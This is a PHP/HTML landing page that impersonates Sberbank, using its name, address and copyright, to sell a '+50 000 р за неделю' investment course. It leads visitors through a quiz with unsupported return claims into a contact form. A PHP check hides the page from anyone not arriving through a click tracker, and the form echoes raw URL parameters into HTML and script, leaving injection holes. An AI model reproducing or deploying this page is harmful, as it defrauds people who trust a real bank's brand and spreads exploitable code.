<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>СберБанк</title>
    <link rel="stylesheet" href="./assets/css/normalize.css" />
    <link rel="stylesheet" href="./assets/css/styles.css" />

    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <img src="./assets/img/mf.svg" alt="Logo" class="logo1" />
      x
      <img src="./assets/img/logo.svg" alt="Logo" class="logo2" />
    </header>
    <main class="main">
      <div class="main__top">
        <div class="main__intro">
          <h2 class="intro__heading top">Официально и доступно каждому </h2>
          <span class="intro__heading">Ваш капитал будет работать на вас</span>
        </div>
        <div class="main__vid">
          <video src="./assets/img/vid.mp4" id="main-vid"></video>
        </div>
      </div>
      <div class="main__quiz">
        <div class="quiz__wrapper active" id="quiz1">
          <h2 class="quiz__heading">
            Доступ к  пакету обучения <br />"+50 000 р за неделю"
          </h2>
          <h3 class="quiz__question">Был ли у вас опыт в инвестициях?</h3>
          <div class="quiz__buttons">
            <button type="button" class="quiz__button1">Был успешный</button>
            <button type="button" class="quiz__button1">Был неудачный</button>
            <button type="button" class="quiz__button1">Не было</button>
          </div>
        </div>
        <div class="quiz__wrapper hidden" id="quiz2">
          <h2 class="quiz__heading">
            Доступ к  пакету обучения <br />"+50 000 р за неделю"
          </h2>
          <h3 class="quiz__question">
            От какой суммы в месяц вы хотите зарабатывать на пассивном доходе?
          </h3>
          <div class="quiz__buttons">
            <button type="button" class="quiz__button2">От 75 000</button>
            <button type="button" class="quiz__button2">От 125 000</button>
            <button type="button" class="quiz__button2">От 200 000</button>
          </div>
        </div>
        <div class="quiz__wrapper hidden" id="quiz3">
          <h2 class="quiz__heading">
            Доступ к  пакету обучения <br />"+50 000 р за неделю"
          </h2>
          <h3 class="quiz__question">Откуда вы узнали о нашей платформе?</h3>
          <div class="quiz__buttons">
            <button type="button" class="quiz__button3">
              Реклама в интернете
            </button>
            <button type="button" class="quiz__button3">От друзей</button>
            <button type="button" class="quiz__button3">Реклама в играх</button>
          </div>
        </div>
        <div class="quiz__wrapper hidden" id="quiz4">
          <h2 class="quiz__heading">
            Доступ к  пакету обучения <br />"+50 000 р за неделю"
          </h2>
          <h3 class="quiz__question">
            С какой периодичностью вы планируете выводить средства?
          </h3>
          <div class="quiz__buttons">
            <button type="button" class="quiz__button4">Раз в неделю</button>
            <button type="button" class="quiz__button4">Раз в месяц</button>
            <button type="button" class="quiz__button4">Раз в квартал</button>
          </div>
        </div>
        <div class="quiz__wrapper hidden" id="quiz5">
          <h2 class="quiz__heading">
            Доступ к  пакету обучения <br />"+50 000 р за неделю"
          </h2>
          <h3 class="quiz__question">
            Согласно нашей статистике, клиенты, использующие бесплатного личного
            помощника, увеличивают доходность своих инвестиций на 83,3% по
            сравнению с теми, кто действует самостоятельно
          </h3>
          <div class="quiz__buttons">
            <button type="button" class="quiz__button5">
              Хочу разобраться сам, но понимаю, что буду зарабатывать меньше
            </button>
            <button type="button" class="quiz__button5">
              Готов воспользоваться советами специалиста, чтобы улучшить свои
              результаты
            </button>
          </div>
        </div>
        <div class="quiz__wrapper hidden" id="quiz-form">
          <h2 class="quiz__heading">
            Доступ к  пакету обучения <br />"+50 000 р за неделю"
          </h2>
          <h3 class="quiz__question">Заполните данные чтобы начать работу</h3>
          <form
            class="form _main-form contact-form freg thin rounded"
            id="main-form"
            method="post"
          >
            <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
            <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
            <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
            type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
            type="hidden" id="source" value='<?= $_GET['source'] ?>'>
          </form>
        </div>
      </div>
      <!--------- QUESTION 1 --------->
      <div id="modal-1" class="modal">
        <div class="modal__content">
          <p class="modal__question">Вам больше 21 года?</p>
          <div class="modal__actions">
            <a href="err.html" class="modal__button--second modal__button--no"
              >Нет</a
            >
            <button class="modal__button--second" id="modal1-btn">Да</button>
          </div>
        </div>
      </div>
      <!--------- QUESTION 2 --------->
      <div id="modal-2" class="modal hidden">
        <div class="modal__content">
          <p class="modal__question">
            Вы являетесь гражданином или резидентом Российской Федерации?
          </p>
          <div class="modal__actions">
            <a href="err.html" class="modal__button--second modal__button--no"
              >Нет</a
            >
            <button
              class="modal__button--second modal__button--yes"
              id="modal2-btn"
            >
              Да
            </button>
          </div>
        </div>
      </div>
    </main>
    <footer class="footer">
      <img
        src="./assets/img/logo_f.svg"
        alt="Logo"
        class="footer__logo mobile"
      />
      <ul class="footer__menu">
        <li class="menu__item">Ваша безопасность</li>
        <li class="menu__item">О банке</li>
        <li class="menu__item">Связаться с банком</li>
        <li class="menu__item">Вопросы и ответы</li>
        <li class="menu__item">Политика обработки данных</li>
      </ul>
      <img
        src="./assets/img/logo_f.svg"
        alt="Logo"
        class="footer__logo desktop"
      />
      <div class="footer__info">
        <span class="footer__text">
          Россия, Москва, 117997, ул. Вавилова, 19 <br />© 1997—2025 ПАО
          Сбербанк.
        </span>
        <div class="footer__socials">
          <img src="./assets/img/vk.svg" alt="Icon" />
          <img src="./assets/img/ok.svg" alt="Icon" />
          <img src="./assets/img/tg.svg" alt="Icon" />
        </div>
      </div>
    </footer>
    <script src="./assets/js/main.js"></script>

    <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
